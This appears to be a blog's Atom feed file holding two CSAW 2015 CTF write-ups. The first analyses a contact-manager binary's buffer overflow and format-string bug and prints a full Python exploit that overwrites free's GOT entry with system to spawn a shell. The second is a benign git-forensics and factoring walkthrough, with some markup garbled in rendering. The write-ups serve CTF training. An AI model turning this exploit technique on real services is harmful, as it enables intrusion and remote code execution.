@@ -1,0 +1,562 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Csaw, | GeeksSpeak Team Blog]]></title>
+  <link href="http://geeksspeak.github.io/blog/categories/csaw/atom.xml" rel="self"/>
+  <link href="http://geeksspeak.github.io/"/>
+  <updated>2015-09-21T17:50:10+04:30</updated>
+  <id>http://geeksspeak.github.io/</id>
+  <author>
+    <name><![CDATA[GeeksSpeak]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2015 - PWN250 - Contacts]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/"/>
+    <updated>2015-09-21T17:43:52+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts</id>
+    <content type="html"><![CDATA[<p><strong>CSAW 2015 contacts Writeup</strong><br/>
+<strong>Point = 250</strong><br/>
+<strong>Category = Exploitable</strong></p>
+
+<p>Hi,</p>
+
+<p>we are given a binary <code>contacts</code>,</p>
+
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file contacts
+contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped
+</code></pre>
+
+<p>The binary seems to be a contact manager, based on my analysis it has a buffer at <code>BSS</code>, and every time we create a contact this structure will be located at the buffer:</p>
+
+<pre><code>struct contact {
+    char *desc;
+    char *num;
+    char name[64];
+    unsigned int desc_length;
+    int enabled;
+};
+</code></pre>
+
+<p><code>desc</code> is the contacs description and allocates a buffer with buffer size <code>des_length</code>. <code>num</code> is the contact number with size <code>0xb</code>.</p>
+
+<p>So, we are going to find vulnerabilities.</p>
+
+<p>I named <code>0x08048980</code> => <code>editCon</code>, this function edites the contact which you give its name, let&rsquo;s check the decompilation:</p>
+
+<pre><code>int __cdecl editCon(int a1)
+{
+  int n; // [sp+1Ch] [bp-5Ch]@6
+  int v3; // [sp+20h] [bp-58h]@5
+  int v4; // [sp+24h] [bp-54h]@1
+  int v5; // [sp+28h] [bp-50h]@3
+  char s; // [sp+2Ch] [bp-4Ch]@1
+  int v7; // [sp+6Ch] [bp-Ch]@1
+
+  v7 = *MK_FP(__GS__, 20);
+  v4 = a1;
+  printf("Name to change? ");
+  fgets(&amp;s, 64, stdin);
+  if ( strchr(&amp;s, 10) )
+    *strchr(&amp;s, 10) = 0;
+  v5 = 0;
+  while ( 1 )
+  {
+    if ( v5 &gt; 9 )
+    {
+      puts("Name not found");
+      return *MK_FP(__GS__, 20) ^ v7;
+    }
+    if ( !strcmp(&amp;s, (v4 + 8)) )
+      break;
+    ++v5;
+    v4 += 80;
+  }
+  printf("1.Change name\n2.Change description\n&gt;&gt;&gt; ");
+  __isoc99_scanf("%u%*c", &amp;v3);
+  if ( v3 == 1 )
+  {
+    printf("New name: ");
+    fgets((v4 + 8), n, stdin);
+    if ( strchr((v4 + 8), 10) )
+      *strchr((v4 + 8), 10) = 0;
+  }
+  else if ( v3 == 2 )
+  {
+    free(*v4);
+    printf("Length of description: ");
+    __isoc99_scanf("%u%*c", &amp;n);
+    printf("Description: \n\t");
+    *v4 = malloc(n);
+    fgets(*v4, n, stdin);
+  }
+  else
+  {
+    puts("Bad option");
+  }
+  return *MK_FP(__GS__, 20) ^ v7;
+</code></pre>
+
+<p>As you may noticed when i try to edit the name there is no input length check a buffer overflow vulnerability. but there may be a problem since we don&rsquo;t know it&rsquo;s value <code>n</code>.
+this can be fixed by first preparing a description edit, so after entering the function again we have a known size.</p>
+
+<p>and after some diging we can notice there is an another vulnerability,  <code>0x08048bd1</code> => pCon:</p>
+
+<pre><code>int __cdecl pCon(int a1, int a2, int a3, char *format)
+{
+  printf("\tName: %s\n", a1);
+  printf("\tLength %u\n", a2);
+  printf("\tPhone #: %s\n", a3);
+  printf("\tDescription: ");
+  return printf(format);
+}
+</code></pre>
+
+<p>Here we go, a nice format string vulnerability.</p>
+
+<p>by using these two vulnerabilites we have write-what-where primitive to exploit the binary.</p>
+
+<p>this is my scenario,</p>
+
+<ol>
+<li>create a contact.</li>
+<li>leak a pointer to locate the <code>system</code> symbol using fmt vuln.</li>
+<li>create second contact.</li>
+<li>leak second contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>create third contact.</li>
+<li>leak third contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>Overflow first contact name into the second and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free</code> got address.</li>
+<li>Overflow second contact name into the third and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free+2</code> got address.</li>
+<li>Edit second and third contacts description to <code>%####x%1$hn</code> and proper number to overwrite <code>free</code> to <code>system</code></li>
+<li>Edit first contact description to &lsquo;/bin/sh\x00&rsquo;</li>
+<li>delete first contact and pop a shell.</li>
+</ol>
+
+
+<p>Of course null byte is not our concern since fgets is used in reading procedure.</p>
+
+<p><strong> please notice i used <code>precision</code> task libc version </strong> but you can use libc_database to find a proper one blindly.</p>
+
+<p>I should declare there maybe another or better solution but this let me in ;)</p>
+
+<p>and finally out exploit:</p>
+
+<pre><code>#!/usr/bin/python
+
+
+import telnetlib
+import struct
+import socket
+import re
+import time
+from hexdump import hexdump
+import pdb
+
+#system_offset = 0x22a32 # local - ubuntu 15.04 - libc6-2.21-0ubuntu4
+system_offset = 0x2670d # Remote -  ubuntu 14.04.2 - libc6_2.19-0ubuntu6.
+
+def readuntil(f, delim='&gt;&gt;&gt; '):
+    data = ''
+    while not data.endswith(delim):
+        c = f.read(1)
+        assert len(c) &gt; 0
+        data += c
+    #print data
+    return data
+
+def p(v):
+    return struct.pack('&lt;Q', v)
+
+def u(v):
+    return struct.unpack('&lt;Q', v)[0]
+
+
+
+def create_c(f, n, num, l, desc):
+    print "[+] Create Contact"
+    f.write("1\n")
+    readuntil(f, 'Name: ')
+    f.write(n+"\n")
+    readuntil(f, ' No: ')
+    f.write(num+"\n")
+    readuntil(f, 'of description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Enter description:\n\t\t')
+    f.write(desc+"\n")
+    #print "MM", f.read(1024)
+    readuntil(f)
+
+
+def edit_con_nameon_desc(f, n, l, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("2\n")
+    readuntil(f, 'description: ')
+    f.write(str(l)+"\n")
+    readuntil(f, 'Description: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def edit_con_name(f, n, v):
+    print "[+] Edit Contact"
+    f.write("3\n")
+    readuntil(f, 'change? ')
+    f.write(n+"\n")
+    readuntil(f)
+    f.write("1\n")
+    readuntil(f, 'name: ')
+    f.write(v+"\n")
+    readuntil(f)
+
+def print_c(f):
+    print "[+] Print Contact"
+    f.write("4\n")
+    return readuntil(f)
+
+def delete_c(f, n):
+    print "[+] Delete Contact"
+    f.write("2\n")
+    readuntil(f, 'remove? ')
+    f.write(n+"\n")
+
+s = socket.socket()
+
+#s.connect(("54.165.223.128", 2555))
+s.connect(("127.0.0.1", 1337))
+
+f = s.makefile('rw', bufsize=0)
+
+readuntil(f)
+
+raw_input("$")
+
+#pdb.set_trace()
+create_c(f, "AA", "123123", 200, "%31$p\n")
+pr = print_c(f)
+address = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(address)
+system_offset += address
+print "[+] system address = ", hex(system_offset)
+edit_con_nameon_desc(f, "AA", 200, "/bin/sh\x00")
+create_c(f, "BB", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr)
+heap_addr += 0x10
+
+edit_con_nameon_desc(f, "BB", 200, "BBB")
+
+create_c(f, "CC", "123123", 200, "%1$p\n")
+pr = print_c(f)
+heap_addr_c = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+print "[+] address = ", hex(heap_addr_c)
+heap_addr_c += 0x10
+
+edit_con_nameon_desc(f, "CC", 200, "CCC")
+
+edit_con_name(f, "AA", "AA\x00"+"A"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr) + struct.pack("&lt;I", 0x0804b014) + "BB\x00\n")
+
+edit_con_name(f, "BB", "BB\x00"+"B"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr_c) + struct.pack("&lt;I", 0x0804b016) + "CC\x00\n")
+
+
+edit_con_nameon_desc(f, "BB", 200, "%{}x%1$hn".format(system_offset &amp; 0xffff))
+edit_con_nameon_desc(f, "CC", 200, "%{}x%1$hn".format((system_offset &gt;&gt; 16) &amp; 0xffff))
+print_c(f)
+
+delete_c(f, "AA")
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+
+
+s.close()
+</code></pre>
+
+<p>And running the expl:</p>
+
+<pre><code>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ python sol.py 
+$
+[+] Create Contact
+[+] Print Contact
+[+] address =  0xf75a9a83
+[+] system address =  0xf75d0190
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea10e8
+[+] Edit Contact
+[+] Create Contact
+[+] Print Contact
+[+] address =  0x9ea11c8
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Edit Contact
+[+] Print Contact
+[+] Delete Contact
+cat flag
+flag{f0rm47_s7r1ng5_4r3_fun_57uff}
+</code></pre>
+
+<p>@HAMIDx9</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2015 - FOR400 - Sharpturn]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-for400-sharpturn/"/>
+    <updated>2015-09-21T17:42:51+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-for400-sharpturn</id>
+    <content type="html"><![CDATA[<h1>CSAW 2015 - FOR400 - Sharpturn</h1>
+
+<p>Basic useful feature list:</p>
+
+<ul>
+<li>I think my SATA controller is dying.</li>
+<li>HINT: git fsck -v</li>
+</ul>
+
+
+<p>We had a tar.xz file , after extracting found a git repository.
+We had a good hint :
+<code>bash
+git fsck -v
+</code>
+and the response :
+<code>bash
+Checking HEAD link
+Checking object directory
+Checking directory objects/2b
+Checking directory objects/2e
+Checking directory objects/35
+Checking directory objects/4a
+Checking directory objects/4c
+Checking directory objects/7c
+Checking directory objects/a1
+Checking directory objects/cb
+Checking directory objects/d5
+Checking directory objects/d9
+Checking directory objects/e5
+Checking directory objects/ef
+Checking directory objects/f8
+Checking tree 2bd4c81f7261a60ecded9bae3027a46b9746fa4f
+Checking commit 2e5d553f41522fc9036bacce1398c87c2483c2d5
+error: sha1 mismatch 354ebf392533dce06174f9c8c093036c138935f3
+error: 354ebf392533dce06174f9c8c093036c138935f3: object corrupt or missing
+Checking commit 4a2f335e042db12cc32a684827c5c8f7c97fe60b
+Checking tree 4c0555b27c05dbdf044598a0601e5c8e28319f67
+Checking commit 7c9ba8a38ffe5ce6912c69e7171befc64da12d4c
+Checking tree a1607d81984206648265fbd23a4af5e13b289f83
+Checking tree cb6c9498d7f33305f32522f862bce592ca4becd5
+Checking commit d57aaf773b1a8c8e79b6e515d3f92fc5cb332860
+error: sha1 mismatch d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+error: d961f81a588fcfd5e57bbea7e17ddae8a5e61333: object corrupt or missing
+Checking blob e5e5f63b462ec6012bc69dfa076fa7d92510f22f
+Checking blob efda2f556de36b9e9e1d62417c5f282d8961e2f8
+error: sha1 mismatch f8d0839dd728cb9a723e32058dcc386070d5e3b5
+error: f8d0839dd728cb9a723e32058dcc386070d5e3b5: object corrupt or missing
+Checking connectivity (32 objects)
+Checking a1607d81984206648265fbd23a4af5e13b289f83
+Checking e5e5f63b462ec6012bc69dfa076fa7d92510f22f
+Checking 4a2f335e042db12cc32a684827c5c8f7c97fe60b
+Checking cb6c9498d7f33305f32522f862bce592ca4becd5
+Checking 4c0555b27c05dbdf044598a0601e5c8e28319f67
+Checking 2bd4c81f7261a60ecded9bae3027a46b9746fa4f
+Checking 2e5d553f41522fc9036bacce1398c87c2483c2d5
+Checking efda2f556de36b9e9e1d62417c5f282d8961e2f8
+Checking 354ebf392533dce06174f9c8c093036c138935f3
+missing blob 354ebf392533dce06174f9c8c093036c138935f3
+Checking d57aaf773b1a8c8e79b6e515d3f92fc5cb332860
+Checking f8d0839dd728cb9a723e32058dcc386070d5e3b5
+missing blob f8d0839dd728cb9a723e32058dcc386070d5e3b5
+Checking d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+missing blob d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+Checking 7c9ba8a38ffe5ce6912c69e7171befc64da12d4c
+</code></p>
+
+<p>We can see a missing blobs and SHA1 mismatch . maybe its broken so we need to repair objects hashes .
+but lets search more .
+<code>bash
+git ls-tree -r HEAD
+100644 blob e5e5f63b462ec6012bc69dfa076fa7d92510f22f    Makefile
+100644 blob f8d0839dd728cb9a723e32058dcc386070d5e3b5    sharp.cpp
+</code>
+We can see sharp.cpp and Makefile , its good .go on lets check commits log :
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>git log <span class="p">&amp;</span>ndash<span class="p">;</span>oneline <span class="p">&amp;</span>ndash<span class="p">;</span>raw -c&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;4a2f335 All <span class="k">done</span> now! Should calculate the flag..assuming everything went okay.
+</span><span class='line'>:000000 <span class="m">100644</span> 0000000<span class="p">&amp;</span>hellip<span class="p">;</span> e5e5f63<span class="p">&amp;</span>hellip<span class="p">;</span> A  Makefile
+</span><span class='line'>:100644 <span class="m">100644</span> d961f81<span class="p">&amp;</span>hellip<span class="p">;</span> f8d0839<span class="p">&amp;</span>hellip<span class="p">;</span> M  sharp.cpp
+</span><span class='line'>d57aaf7 There<span class="p">&amp;</span>rsquo<span class="p">;</span>s only two factors. Don<span class="p">&amp;</span>rsquo<span class="p">;</span>t <span class="nb">let </span>your calculator lie.
+</span><span class='line'>:100644 <span class="m">100644</span> 354ebf3<span class="p">&amp;</span>hellip<span class="p">;</span> d961f81<span class="p">&amp;</span>hellip<span class="p">;</span> M  sharp.cpp
+</span><span class='line'>2e5d553 It<span class="p">&amp;</span>rsquo<span class="p">;</span>s getting better!
+</span><span class='line'>:100644 <span class="m">100644</span> efda2f5<span class="p">&amp;</span>hellip<span class="p">;</span> 354ebf3<span class="p">&amp;</span>hellip<span class="p">;</span> M  sharp.cpp
+</span><span class='line'>7c9ba8a Initial commit! This one should be fun.
+</span><span class='line'>:000000 <span class="m">100644</span> 0000000<span class="p">&amp;</span>hellip<span class="p">;</span> efda2f5<span class="p">&amp;</span>hellip<span class="p">;</span> A  sharp.cpp
+</span><span class='line'>&lt;code&gt;
+</span><span class='line'>it seems we are in a good way , it seems sharp.cpp calculate flag .
+</span><span class='line'>lets try <span class="nb">read </span>sharp.cpp , logs should be a good place :<span class="o">)</span>
+</span><span class='line'>&lt;/code&gt;bash
+</span><span class='line'>git log -p -m&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;All <span class="k">done</span> now! Should calculate the flag..assuming everything went okay.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;diff <span class="p">&amp;</span>ndash<span class="p">;</span>git a/Makefile b/Makefile
+</span><span class='line'>new file mode 100644
+</span><span class='line'>index 0000000..e5e5f63
+</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;</span> /dev/null
+</span><span class='line'>+++ b/Makefile
+</span><span class='line'>@@ -0,0 +1,6 @@
+</span><span class='line'>+
+</span><span class='line'>+CXXFLAGS:<span class="o">=</span>-O2 -g -Wall -Wextra -Wshadow -std<span class="o">=</span>c++11
+</span><span class='line'>+LDFLAGS:<span class="o">=</span>-lcrypto
+</span><span class='line'>+
+</span><span class='line'>+ALL:
+</span><span class='line'>+       <span class="k">$(</span>CXX<span class="k">)</span> <span class="k">$(</span>CXXFLAGS<span class="k">)</span> <span class="k">$(</span>LDFLAGS<span class="k">)</span> -o sharp sharp.cpp
+</span><span class='line'>diff <span class="p">&amp;</span>ndash<span class="p">;</span>git a/sharp.cpp b/sharp.cpp
+</span><span class='line'>index d961f81..f8d0839 100644
+</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;</span> a/sharp.cpp
+</span><span class='line'>+++ b/sharp.cpp
+</span><span class='line'>@@ -2,8 +2,57 @@
+</span><span class='line'> <span class="c">#include &lt;string&gt;</span>
+</span><span class='line'> <span class="c">#include &lt;algorithm&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;+#include <span class="p">&amp;</span>lt<span class="p">;</span>stdint.h&gt;
+</span><span class='line'>+#include <span class="p">&amp;</span>lt<span class="p">;</span>stdio.h&gt;
+</span><span class='line'>+#include <span class="p">&amp;</span>lt<span class="p">;</span>openssl/sha.h&gt;
+</span><span class='line'>+
+</span><span class='line'> using namespace std<span class="p">;</span>
+</span><span class='line'>+std::string calculate_flag<span class="o">(</span>
+</span><span class='line'>+               std::string <span class="p">&amp;</span>amp<span class="p">;</span>part1,
+</span><span class='line'>+               int64_t part2,
+</span><span class='line'>+               std::string <span class="p">&amp;</span>amp<span class="p">;</span>part4,
+</span><span class='line'>+               uint64_t factor1,
+</span><span class='line'>+               uint64_t factor2<span class="o">)</span>
+</span><span class='line'> <span class="p">&amp;</span>hellip<span class="p">;&amp;</span>hellip<span class="p">;</span>.. Bunch of Code .
+</span></code></pre></td></tr></table></div></figure>`
+We find it .
+Full  source Code here : <a href="http://paste2.org/9Mnm1MX6">http://paste2.org/9Mnm1MX6</a></p>
+
+<p>after compiling , and running :
+<code>bash
+parsa@xored:~/Desktop$ ./for400
+Part1: Enter flag:
+flag
+Part2: Input 31337:
+31337
+Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194
+watched
+Part4: C.R.E.A.M. Get da _____:
+money
+Part5: Input the two prime factors of the number 272031727027.
+</code>
+we need 5 part to get flag , it seems we have 4 parts , they are flag,31337,watched,money but we need 5th part .
+lets factor 272031727027 to primes .</p>
+
+<p>Python Code :
+<code>python
+def factors(n):
+    i = 2
+    factors = []
+    while i * i &lt;= n:
+        if n % i:
+            i += 1
+        else:
+            n //= i
+            factors.append(i)
+    if n &gt; 1:
+        factors.append(n)
+    return factors
+num = 272031727027
+print factors(num)
+</code>
+Result :
+<code>bash
+parsa@xored:~/Desktop$ python aaa.py
+[31357, 8675311]
+</code>
+lets run Binary again :
+<code>bash
+parsa@xored:~/Desktop$ ./for400
+Part1: Enter flag:
+flag
+Part2: Input 31337:
+31337
+Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194
+watched
+Part4: C.R.E.A.M. Get da _____:
+money
+Part5: Input the two prime factors of the number 272031727027.
+31357
+8675311
+flag{3b532e0a187006879d262141e16fa5f05f2e6752}
+</code>
+and done The flag is :
+3b532e0a187006879d262141e16fa5f05f2e6752</p>
+
+<p>Good Luck .</p>
+]]></content>
+  </entry>
+  
+</feed>
